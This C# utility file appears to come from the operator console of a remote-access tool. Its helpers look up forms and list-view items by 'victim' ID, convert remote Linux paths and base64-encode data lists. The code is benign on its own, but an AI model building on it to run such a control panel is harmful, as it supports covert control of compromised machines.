using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.CodeDom;

namespace Eden
{
    public class clsTools
    {
        public static int MAX_BUFFER_LENGTH = 65536;

        public static string GenerateRandomString(int nLength = 10)
        {
            const string szChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random();
            char[] acResult = new char[nLength];

            for (int i = 0; i < nLength; i++)
            {
                acResult[i] = szChars[random.Next(szChars.Length)];
            }

            return new string(acResult);
        }

        public static string GetFileNameFromDatetime(string szExt = null)
        {
            DateTime date = DateTime.Now;
            return string.Join("", new int[]
            {
                date.Year,
                date.Month,
                date.Day,
                date.Hour,
                date.Minute,
                date.Second,
                date.Millisecond,
            }
            .Select(x => x.ToString())) + (string.IsNullOrEmpty(szExt) ? "" : "." + szExt);
        }

        public static T? FindForm<T>(clsVictim victim, bool bBringToFront = true) where T : Form
        {
            foreach (Form form in Application.OpenForms)
            {
                if (form is not T typedForm)
                    continue;

                var propInfo = form.GetType().GetProperty(
                    "m_victim",
                    BindingFlags.Public | BindingFlags.Instance | BindingFlags.NonPublic
                );

                if (propInfo?.GetValue(form) is not clsVictim vic)
                    continue;

                if (!string.Equals(vic.m_szID, victim.m_szID))
                    continue;

                if (bBringToFront)
                    typedForm.BringToFront();

                return typedForm;
            }

            return null;
        }

        public static T FindForm<T>(string szVictimID = null, bool bBringToFront = true) where T : Form
        {
            foreach (Form form in Application.OpenForms)
            {
                if (typeof(T).Name == form.GetType().Name)
                {
                    string szFieldName = "m_szVictimID";
                    var fieldInfo = form.GetType().GetField(szFieldName, BindingFlags.Public | BindingFlags.Instance);
                    if (fieldInfo != null)
                    {
                        object fieldValue = fieldInfo.GetValue(form);
                        if (fieldValue != null && fieldValue.ToString() == szVictimID && form.GetType() == typeof(T))
                        {
                            ((T)form).BringToFront();

                            return (T)form;
                        }
                    }

                    else
                    {
                        string szPropName = szFieldName;
                        var prop = form.GetType().GetProperty(szPropName, BindingFlags.Public | BindingFlags.Instance);
                        if (prop != null)
                        {
                            object propValue = prop.GetValue(form);
                            if (propValue != null && propValue.ToString() == szVictimID && form.GetType() == typeof(T))
                            {
                                ((T)form).BringToFront();
                                return (T)form;
                            }
                        }
                        else
                        {
                            //MessageBox.Show("Cannot find field or property: " + szFieldName);
                        }
                    }
                }
            }

            return null;
        }

        public static Image Base64ToIamge(string szBase64String)
        {
            byte[] abBuffer = Convert.FromBase64String(szBase64String);
            using (MemoryStream ms = new MemoryStream(abBuffer))
            {
                Image img = Image.FromStream(ms);
                return img;
            }
        }

        public static bool IsImageFilename(string szFilename)
        {
            string ext = Path.GetExtension(szFilename).ToLower().Trim('.');
            if (string.IsNullOrEmpty(ext))
                return false;

            return new string[] { "png", "bmp", "jpg" }.Contains(ext);
        }

        public static string TreeNodePathToLinuxPath(string szTreeNodeFullPath) => szTreeNodeFullPath.Replace("\\", "/").Replace("///", "/").Replace("//", "");
        public static string LinuxPathToTreeNodePath(string szLinuxPath) => $"/{szLinuxPath.Replace("/", "\\")}";

        public static clsVictim fnGetVictimTag(ListViewItem item)
        {
            return (clsVictim)item.Tag;
        }

        public class Debug
        {
            public static string DisplayBytes(byte[] abBuffer)
            {
                return BitConverter.ToString(abBuffer).Replace("-", "\\x");
            }
        }

        public class EZData
        {
            public static string OneDList2String(List<string> lsInput, string szSpliter = ",")
            {
                return string.Join(szSpliter, lsInput.Select(x => EZCrypto.Encoder.stre2b64(x)));
            }

            public static string TwoDList2String(List<List<string>> lsInput, string szInnerSpliter = ",", string szOuterSpliter = ";")
            {
                return string.Join(szOuterSpliter,
                    lsInput.Select(
                        x => string.Join(szInnerSpliter,
                            x.Select(y => EZCrypto.Encoder.stre2b64(y))
                            )
                        )
                    );
            }

            public static List<string> String2OneDList(string szData, string szSpliter = ",")
            {
                return szData.Split(new string[] { szSpliter }, StringSplitOptions.None)
                    .Select(x => EZCrypto.Encoder.b64d2str(x))
                    .ToList();
            }

            public static List<List<string>> String2TwoDList(string szData, string szOuterSpliter = ";", string szInnerSpliter = ",")
            {
                return szData.Split(
                    new string[] { szOuterSpliter }, StringSplitOptions.None)
                    .Select(x => x.Split( new string[] { szInnerSpliter }, StringSplitOptions.None)
                    .Select(y => EZCrypto.Encoder.b64d2str(y))
                    .ToList())
                    .ToList();
            }

            public static Dictionary<string, JsonElement>? JsonStr2Dic(string szJson)
            {
                return JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(szJson);
            }
        }
    }
}
